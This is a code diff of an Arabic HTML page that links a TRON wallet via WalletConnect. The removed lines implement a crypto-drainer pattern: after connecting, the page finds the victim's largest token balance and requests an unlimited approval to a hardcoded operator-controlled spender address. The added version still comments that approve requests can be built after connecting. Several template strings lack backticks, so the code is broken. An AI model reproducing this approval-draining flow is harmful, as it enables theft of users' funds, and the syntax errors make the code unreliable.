@@ -3,138 +3,65 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>ربط محفظة TRON مع WalletConnect وطلب Approve</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.6.6/dist/umd/index.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.6.3/dist/umd/index.min.js"></script>
+<title>ربط محفظة TRON بـ WalletConnect</title>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/client@1.7.9/dist/umd/index.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.7.2/dist/umd/index.min.js"></script>
 </head>
-<body style="font-family: Arial; direction: rtl; padding: 20px;">
+<body>
 
-<h2>ربط محفظة TRON وطلب Approve تلقائي</h2>
-<button id="connectBtn" style="font-size:18px; padding:10px 20px;">ربط المحفظة</button>
-<p id="status"></p>
+<button id="connectWalletBtn">ربط المحفظة</button>
 
 <script>
-  const connectBtn = document.getElementById('connectBtn');
-  const statusP = document.getElementById('status');
-
-  // WalletConnect client
   const WalletConnect = window.WalletConnect.default;
-  const QRCodeModal = window.QRCodeModal;
+  const QRCodeModal = window.WalletConnectQRCodeModal.default;
 
-  let walletConnector = null;
-  let tronWeb = null;
-  let userAddress = null;
+  // إنشاء كائن WalletConnect جديد (لجلسة جديدة)
+  const connector = new WalletConnect({
+    bridge: "https://bridge.walletconnect.org", // جسر الاتصال
+    qrcodeModal: QRCodeModal
+  });
 
-  // عناوين التوكنات على شبكة Tron (مثال)
-  const tokenContracts = {
-    "Tether USD": "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj", // USDT-TRC20
-    "JustStable": "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf", // مثال توكن آخر
-    // ممكن تضيف المزيد هنا
-  };
-
-  // عنوان حساب السبندر (محفظتك)
-  const spenderAddress = "TJSPENDERADDRESSYOURWALLET123456789"; // غيرها لعنوان محفظتك
-
-  connectBtn.onclick = async () => {
-    if (walletConnector && walletConnector.connected) {
-      statusP.textContent = "محفظة متصلة بالفعل";
-      return;
+  async function connectWallet() {
+    if (!connector.connected) {
+      // إنشاء جلسة جديدة
+      await connector.createSession();
     }
 
-    // إنشاء جلسة WalletConnect جديدة
-    walletConnector = new WalletConnect({
-      bridge: "https://bridge.walletconnect.org",
-      qrcodeModal: QRCodeModal,
-    });
+    // عرض رابط deep link للموبايل (URI)
+    const uri = connector.uri;
+    console.log("URI:", uri);
 
-    // لو الجلسة موجودة سابقة
-    if (!walletConnector.connected) {
-      await walletConnector.createSession();
+    // على الموبايل: توجه المحفظة تلقائي
+    // Deep link مخصص لـ Trust Wallet أو TronLink (معظم المحافظ تدعم WalletConnect)
+    // هذه الصيغة تطلب فتح تطبيق المحفظة تلقائيًا مع URI الجلسة
+    const deepLink = https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)};
+
+    // فتح رابط الـ deep link
+    window.location.href = deepLink;
+  }
+
+  // الزرار يربط المحفظة
+  document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);
+
+  // التعامل مع حدث الاتصال
+  connector.on("connect", (error, payload) => {
+    if (error) {
+      throw error;
     }
+    console.log("تم الاتصال بالمحفظة!");
 
-    // عرض QR تلقائي (لو مستخدم من كروم/سفاري على الكمبيوتر)
-    walletConnector.on("display_uri", (err, payload) => {
-      if (err) {
-        console.error(err);
-        return;
-      }
-      const uri = payload.params[0];
-      QRCodeModal.open(uri, () => {
-        console.log("QR Code modal closed");
-      });
-    });
+    // هنا يمكنك الحصول على عنوان المحفظة من payload
+    const accounts = payload.params[0].accounts;
+    console.log("عنوان المحفظة:", accounts[0]);
+    // تقدر تبني هنا طلبات approve بعد الربط
+  });
 
-    walletConnector.on("connect", async (error, payload) => {
-      if (error) {
-        console.error(error);
-        return;
-      }
-      QRCodeModal.close();
-
-      // الحصول على عنوان المستخدم
-      userAddress = payload.params[0].accounts[0];
-      statusP.textContent = تم الربط مع العنوان: ${userAddress};
-
-      // إنشاء TronWeb مع provider من WalletConnect (محتاج مكتبة وسيطة في الحقيقة)
-      tronWeb = new TronWeb({
-        fullHost: 'https://api.trongrid.io',
-        privateKey: null, // المفتاح الخاص محلي في المحفظة، ما فيش هنا
-      });
-
-      // نبدأ الفحص لأكبر رصيد توكن عند المستخدم (كل توكن في tokenContracts)
-      let maxBalance = 0;
-      let tokenToApprove = null;
-
-      for (const [name, contractAddr] of Object.entries(tokenContracts)) {
-        try {
-          const contract = await tronWeb.contract().at(contractAddr);
-          let balance = await contract.balanceOf(userAddress).call();
-          balance = tronWeb.toBigNumber(balance).toNumber();
-
-          if (balance > maxBalance) {
-            maxBalance = balance;
-            tokenToApprove = {name, contractAddr};
-          }
-        } catch(e) {
-          console.error(`خطأ في جلب الرصيد لـ ${name}:`, e);
-        }
-      }
-
-      if (!tokenToApprove) {
-        statusP.textContent = "لم يتم العثور على توكن يحتوي على رصيد.";
-        return;
-      }
-
-      statusP.textContent += <br>أكبر رصيد موجود في: ${tokenToApprove.name} (${maxBalance});
-
-      // طلب الapprove (تفويض لا محدود)
-      try {
-        const contract = await tronWeb.contract().at(tokenToApprove.contractAddr);
-        const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-        // هنا في الواقع لازم يتم التوقيع من قبل المستخدم في المحفظة (لا يمكن عمل approve تلقائي من الكود فقط)
-        // الكود التالي مجرد مثال استدعاء دالة approve
-
-        await contract.approve(spenderAddress, MAX_UINT).send({feeLimit: 100_000_000, // سقف رسوم الغاز
-          callValue: 0,
-          shouldPollResponse: true
-        });
-
-        statusP.textContent += "<br>تم طلب التفويض (Approve) بنجاح، يرجى تأكيد العملية في محفظتك.";
-      } catch (e) {
-        statusP.textContent += "<br>حدث خطأ في طلب التفويض: " + e.message;
-      }
-    });
-
-    walletConnector.on("disconnect", (error, payload) => {
-      if (error) {
-        console.error(error);
-        return;
-      }
-      statusP.textContent = "تم قطع الاتصال بالمحفظة";
-    });
-  };
+  connector.on("disconnect", (error, payload) => {
+    if (error) {
+      throw error;
+    }
+    console.log("تم قطع الاتصال بالمحفظة");
+  });
 </script>
 
 </body>
